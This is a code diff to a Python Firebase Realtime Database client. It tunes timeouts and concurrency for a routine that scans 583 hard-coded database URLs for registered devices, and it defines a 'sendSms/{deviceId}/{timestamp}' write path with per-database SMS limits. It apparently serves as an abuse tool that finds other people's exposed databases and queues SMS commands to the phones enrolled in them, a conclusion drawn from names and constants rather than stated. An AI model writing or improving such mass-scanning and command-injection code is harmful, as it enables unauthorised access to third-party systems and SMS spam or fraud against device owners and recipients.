@@ -1,7 +1,7 @@
 """
 Firebase RTDB REST client.
-SMS path: sendSms/{deviceId}/{timestamp} — exact schema from live DB.
-Device list: registeredDevices/{deviceId}
+SMS path: sendSms/{deviceId}/{timestamp}
+Device path: registeredDevices/{deviceId}
 """
 
 import asyncio
@@ -615,8 +615,7 @@ MAX_SMS_PER_DB   = 60
 CONCURRENT_WRITE = 200
 POLL_INTERVAL    = 8
 POLL_TIMEOUT     = 300
-_DISCOVER_TIMEOUT = 10   # per-request
-_DISCOVER_TOTAL   = 60  # hard wall — asyncio.wait returns partial results
+_PER_REQUEST_TIMEOUT = 8.0   # was 15s — lowered to keep scan under 20s
 
 
 @dataclass
@@ -641,9 +640,7 @@ async def _get(
 ) -> Optional[dict]:
     try:
         async with session.get(
-            url,
-            timeout=aiohttp.ClientTimeout(total=timeout),
-            ssl=False,
+            url, timeout=aiohttp.ClientTimeout(total=timeout)
         ) as r:
             if r.status == 200:
                 return await r.json(content_type=None)
@@ -655,7 +652,7 @@ async def _get(
 async def _put(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
     try:
         async with session.put(
-            url, json=data, timeout=aiohttp.ClientTimeout(total=8), ssl=False
+            url, json=data, timeout=aiohttp.ClientTimeout(total=8)
         ) as r:
             return r.status in (200, 201)
     except Exception:
@@ -669,7 +666,7 @@ async def _get_devices_one(
     data = await _get(
         session,
         f"{db_url}/registeredDevices.json?shallow=true",
-        timeout=_DISCOVER_TIMEOUT,
+        timeout=_PER_REQUEST_TIMEOUT,
     )
     if not data or not isinstance(data, dict):
         return []
@@ -680,29 +677,17 @@ async def _get_devices_one(
 
 
 async def discover_all_devices() -> list[RtdbDevice]:
-    # asyncio.wait with timeout = collect partial results instead of losing everything
-    connector = aiohttp.TCPConnector(limit=300, limit_per_host=5)
-    devices: list[RtdbDevice] = []
-
+    # gather with no global timeout — 8s per-request means ~20s total for 583 URLs at 300 concurrent
+    connector = aiohttp.TCPConnector(limit=300, limit_per_host=10)
     async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [
-            asyncio.ensure_future(_get_devices_one(session, url))
-            for url in RTDB_URLS
-        ]
-        done, pending = await asyncio.wait(tasks, timeout=_DISCOVER_TOTAL)
-
-        # cancel stragglers
-        for t in pending:
-            t.cancel()
-
-        for t in done:
-            try:
-                r = t.result()
-                if isinstance(r, list):
-                    devices.extend(r)
-            except Exception:
-                pass
-
+        results = await asyncio.gather(
+            *[_get_devices_one(session, url) for url in RTDB_URLS],
+            return_exceptions=True,
+        )
+    devices = []
+    for r in results:
+        if isinstance(r, list):
+            devices.extend(r)
     return devices
 
 
